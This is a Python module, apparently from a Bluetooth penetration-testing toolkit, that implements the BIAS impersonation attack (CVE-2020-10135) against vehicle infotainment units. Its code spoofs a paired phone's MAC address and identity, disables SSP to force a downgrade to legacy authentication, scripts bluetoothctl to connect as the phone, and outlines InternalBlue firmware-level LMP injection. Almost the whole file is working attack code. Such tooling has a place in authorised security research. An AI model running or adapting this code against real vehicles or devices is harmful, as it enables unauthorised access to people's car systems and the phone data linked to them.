"""BIAS (Bluetooth Impersonation AttackS) — CVE-2020-10135.

BIAS exploits a flaw in the Bluetooth BR/EDR authentication procedure where
a device can impersonate any previously paired device by manipulating the
role-switch and authentication mechanisms during connection establishment.

Attack principle:
  1. Spoof the target phone's MAC address
  2. Initiate connection to the IVI (or accept its connection)
  3. During LMP authentication, exploit one of:
     a) Role switch: force central→peripheral role change to skip mutual auth
     b) Downgrade: request legacy authentication instead of secure auth
     c) Unilateral auth: only one side authenticates (IVI authenticates us,
        but we don't authenticate back, or vice versa)
  4. IVI accepts connection believing we are the legitimate phone

Affected versions:
  - All Bluetooth BR/EDR devices using Secure Connections or Legacy auth
  - Spec versions: BT 2.1+ through 5.2 (patched in some 5.3+ implementations)
  - Patches: Bluetooth SIG advisory June 2020, vendor-specific firmware updates

Prerequisites:
  - Ubertooth One or modified BlueZ stack for LMP manipulation
  - InternalBlue framework (for Broadcom/Cypress chipset firmware patching)
  - Target must have an existing pairing (we impersonate one side)

Limitations:
  - Does NOT work if both sides enforce mutual authentication post-patch
  - Requires chipset-level control for LMP manipulation (not just HCI)
  - Detection: unusual role-switch patterns in HCI logs

References:
  - Antonioli et al. "BIAS: Bluetooth Impersonation AttackS" IEEE S&P 2020
  - https://francozappa.github.io/about-bias/
  - CVE-2020-10135
"""

import time
import re

from bt_tap.utils.bt_helpers import run_cmd, check_tool
from bt_tap.core.spoofer import spoof_address, clone_device_identity
from bt_tap.core.adapter import adapter_reset, disable_ssp, enable_page_scan
from bt_tap.utils.output import (
    info, success, error, warning, verbose,
    phase, step, substep, summary_panel, target,
)


class BIASAttack:
    """BIAS attack orchestration for IVI impersonation.

    Provides three approaches in order of practicality:
      1. Role-switch downgrade via bluetoothctl (software-only, best effort)
      2. InternalBlue LMP injection (requires Broadcom/Cypress chipset)
      3. Manual guidance for custom firmware approach
    """

    def __init__(self, ivi_address: str, phone_address: str,
                 phone_name: str = "", hci: str = "hci0"):
        self.ivi_address = ivi_address
        self.phone_address = phone_address
        self.phone_name = phone_name
        self.hci = hci

    def probe_vulnerability(self) -> dict:
        """Probe whether the IVI may be vulnerable to BIAS.

        Checks:
          - SSP support (BIAS targets SSP-paired devices)
          - Bluetooth version (patched in some 5.3+ firmwares)
          - Whether the IVI initiates reconnection (BIAS is easier as responder)

        Returns dict with vulnerability assessment.
        """
        result = {
            "potentially_vulnerable": False,
            "ssp_detected": None,
            "bt_version": None,
            "auto_reconnects": False,
            "notes": [],
        }

        with phase("BIAS Vulnerability Probe"):
            # Check SSP
            with step("Checking SSP support"):
                from bt_tap.recon.sdp import check_ssp
                ssp = check_ssp(self.ivi_address)
                result["ssp_detected"] = ssp
                if ssp is True:
                    info("SSP supported — BIAS targets SSP-paired devices")
                    result["potentially_vulnerable"] = True
                elif ssp is False:
                    info("SSP not detected — BIAS may still apply to legacy pairing")
                    result["potentially_vulnerable"] = True
                    result["notes"].append("Legacy pairing: BIAS not needed, PIN brute-force may suffice")
                else:
                    warning("SSP status unknown")

            # Check BT version
            with step("Checking Bluetooth version"):
                info_result = run_cmd(
                    ["hcitool", "-i", self.hci, "info", self.ivi_address],
                    timeout=10,
                )
                if info_result.returncode == 0:
                    m = re.search(r"LMP Version:\s*(.+)", info_result.stdout)
                    if m:
                        ver_str = m.group(1).strip()
                        result["bt_version"] = ver_str
                        info(f"Bluetooth version: {ver_str}")

                        # Parse numeric version
                        ver_m = re.search(r"(\d+\.\d+)", ver_str)
                        if ver_m:
                            ver = float(ver_m.group(1))
                            if ver >= 5.3:
                                warning("BT 5.3+ — may have BIAS mitigations")
                                result["notes"].append("BT 5.3+: check vendor patch status")
                            else:
                                info(f"BT {ver} — in BIAS-affected range")

            # Check auto-reconnect behavior
            with step("Testing auto-reconnect (passive, 15s)"):
                info("Spoofing phone identity and enabling page scan...")
                clone_device_identity(
                    self.hci, self.phone_address,
                    self.phone_name or "Phone", "0x5a020c",
                )
                enable_page_scan(self.hci)

                end_time = time.time() + 15
                while time.time() < end_time:
                    verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
                    if "Connected: yes" in verify.stdout:
                        result["auto_reconnects"] = True
                        success("IVI auto-reconnected to spoofed identity!")
                        result["notes"].append("Auto-reconnect: IVI initiates connection to spoofed phone")
                        break
                    time.sleep(2)

                if not result["auto_reconnects"]:
                    info("IVI did not auto-reconnect (normal — we'll initiate instead)")

                # Reset adapter
                adapter_reset(self.hci)

            # Summary
            summary_panel("BIAS Probe Results", {
                "Target IVI": self.ivi_address,
                "Phone to impersonate": self.phone_address,
                "SSP": str(result["ssp_detected"]),
                "BT Version": result["bt_version"] or "Unknown",
                "Auto-Reconnects": str(result["auto_reconnects"]),
                "Potentially Vulnerable": str(result["potentially_vulnerable"]),
            })
            for note in result["notes"]:
                substep(f"Note: {note}")

        return result

    def execute_role_switch(self) -> dict:
        """Attempt BIAS via role-switch downgrade (software-only approach).

        This is the best-effort software approach:
          1. Spoof phone MAC + identity
          2. Disable SSP on our adapter (force legacy auth negotiation)
          3. Connect to IVI — during auth, BlueZ may negotiate weaker auth
          4. If IVI accepts, we're connected as the phone

        This works when:
          - IVI doesn't enforce mutual authentication on reconnect
          - IVI accepts legacy auth downgrade from a "known" device
          - IVI has BIAS vulnerability unpatched

        This does NOT work when:
          - IVI enforces Secure Connections Only mode
          - IVI validates link key (we don't have it)
          - IVI has BIAS patches applied
        """
        results = {
            "method": "role_switch_downgrade",
            "connected": False,
            "auth_method": None,
            "notes": [],
        }

        with phase("BIAS Role-Switch Attack"):
            # Step 1: Clone phone identity
            with step(f"Cloning {target(self.phone_address)} identity"):
                if not clone_device_identity(
                    self.hci, self.phone_address,
                    self.phone_name or "Phone", "0x5a020c",
                ):
                    error("Identity clone failed")
                    results["notes"].append("Failed to spoof MAC/name")
                    return results
                success("Identity cloned")
                time.sleep(2)

            # Step 2: Disable SSP to attempt legacy auth downgrade
            with step("Disabling SSP (force legacy auth negotiation)"):
                disable_ssp(self.hci)
                results["notes"].append("SSP disabled on local adapter")
                info("Local adapter will request legacy authentication")
                info("If IVI accepts downgrade, mutual auth may be skipped")

            # Step 3: Enable page scan (be visible as the phone)
            with step("Enabling page scan (visible as phone)"):
                enable_page_scan(self.hci)
                time.sleep(1)

            # Step 4: Attempt connection
            with step(f"Connecting to IVI {target(self.ivi_address)}"):
                import subprocess
                bt_commands = "\n".join([
                    f"trust {self.ivi_address}",
                    f"pair {self.ivi_address}",
                    f"connect {self.ivi_address}",
                    "quit",
                ])
                proc_result = subprocess.run(
                    ["bluetoothctl"],
                    input=bt_commands,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    errors="replace",
                )
                output = proc_result.stdout + proc_result.stderr
                verbose(f"bluetoothctl output:\n{output.strip()}")

                # Parse auth events
                if "AuthenticationFailed" in output:
                    results["auth_method"] = "rejected"
                    results["notes"].append("IVI rejected auth — link key validation enforced")
                elif "AlreadyConnected" in output or "Connected: yes" in output:
                    results["auth_method"] = "accepted_existing"
                    results["notes"].append("IVI accepted connection from existing pairing state")

                time.sleep(3)

            # Step 5: Verify connection
            with step("Verifying connection"):
                verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
                if "Connected: yes" in verify.stdout:
                    results["connected"] = True
                    success("BIAS attack SUCCEEDED — connected to IVI as phone")

                    # Check which auth was used
                    if "Paired: yes" in verify.stdout:
                        results["notes"].append("Device shows as paired")
                    if "Trusted: yes" in verify.stdout:
                        results["notes"].append("Device shows as trusted")
                else:
                    warning("Connection not established")
                    results["notes"].append("IVI may have BIAS mitigations or requires link key")

            # Summary
            status = "SUCCEEDED" if results["connected"] else "FAILED"
            summary_panel(f"BIAS Attack {status}", {
                "Method": "Role-switch / legacy auth downgrade",
                "Connected": str(results["connected"]),
                "Auth Result": results["auth_method"] or "Unknown",
            })
            for note in results["notes"]:
                substep(note)

        return results

    def execute_internalblue(self) -> dict:
        """Attempt BIAS via InternalBlue LMP injection.

        InternalBlue provides firmware-level control over Broadcom/Cypress
        Bluetooth chipsets, allowing direct LMP message manipulation needed
        for the full BIAS attack (role switch + auth bypass at LMP layer).

        Requires:
          - Broadcom/Cypress BT chipset (CYW20735, BCM4345, BCM4358, etc.)
          - InternalBlue installed (pip install internalblue)
          - Root access for firmware patching
        """
        results = {
            "method": "internalblue_lmp",
            "connected": False,
            "internalblue_available": False,
            "notes": [],
        }

        with phase("BIAS via InternalBlue"):
            # Check if InternalBlue is available
            with step("Checking InternalBlue availability"):
                try:
                    import_result = run_cmd(
                        ["python3", "-c", "import internalblue; print('OK')"],
                        timeout=10,
                    )
                    if "OK" in import_result.stdout:
                        results["internalblue_available"] = True
                        success("InternalBlue is available")
                    else:
                        warning("InternalBlue not installed")
                        info("Install: pip install internalblue")
                        info("Requires Broadcom/Cypress chipset (CYW20735, BCM43xx)")
                        results["notes"].append("InternalBlue not available — install for full BIAS")
                        return results
                except Exception:
                    warning("InternalBlue check failed")
                    results["notes"].append("InternalBlue not available")
                    return results

            # Check chipset compatibility
            with step("Checking chipset compatibility"):
                hci_result = run_cmd(["hciconfig", "-a", self.hci], timeout=5)
                chipset_info = hci_result.stdout if hci_result.returncode == 0 else ""

                broadcom = any(kw in chipset_info.lower()
                               for kw in ("broadcom", "cypress", "bcm", "cyw"))
                if broadcom:
                    success("Broadcom/Cypress chipset detected — compatible")
                else:
                    warning("Non-Broadcom chipset — InternalBlue may not work")
                    results["notes"].append("InternalBlue requires Broadcom/Cypress chipset")

            # Guide for manual execution
            info("InternalBlue BIAS attack requires manual firmware patching:")
            info("  1. python3 -m internalblue")
            info("  2. Load BIAS patch for your chipset")
            info("  3. Spoof target MAC (already done by bt-tap)")
            info("  4. Connect — LMP auth will be manipulated at firmware level")
            info("")
            info("Reference: https://github.com/seemoo-lab/internalblue")
            info("BIAS PoC: https://github.com/francozappa/bias")
            results["notes"].append("Manual InternalBlue execution required")

        return results

    def execute(self, method: str = "auto") -> dict:
        """Run BIAS attack with the best available method.

        Methods:
          auto: Try role-switch first, suggest InternalBlue if it fails
          role_switch: Software-only role-switch downgrade
          internalblue: Full BIAS via InternalBlue LMP injection
          probe: Only probe vulnerability, don't attack

        Returns dict with attack results.
        """
        if method == "probe":
            return self.probe_vulnerability()

        if method in ("auto", "role_switch"):
            results = self.execute_role_switch()
            if results["connected"]:
                return results

            if method == "auto":
                info("Role-switch approach did not succeed")
                info("Checking InternalBlue for full LMP-level BIAS...")
                ib_results = self.execute_internalblue()
                # Merge notes
                ib_results["notes"] = results["notes"] + ib_results["notes"]
                return ib_results

            return results

        if method == "internalblue":
            return self.execute_internalblue()

        error(f"Unknown BIAS method: {method}")
        return {"connected": False, "error": f"Unknown method: {method}"}
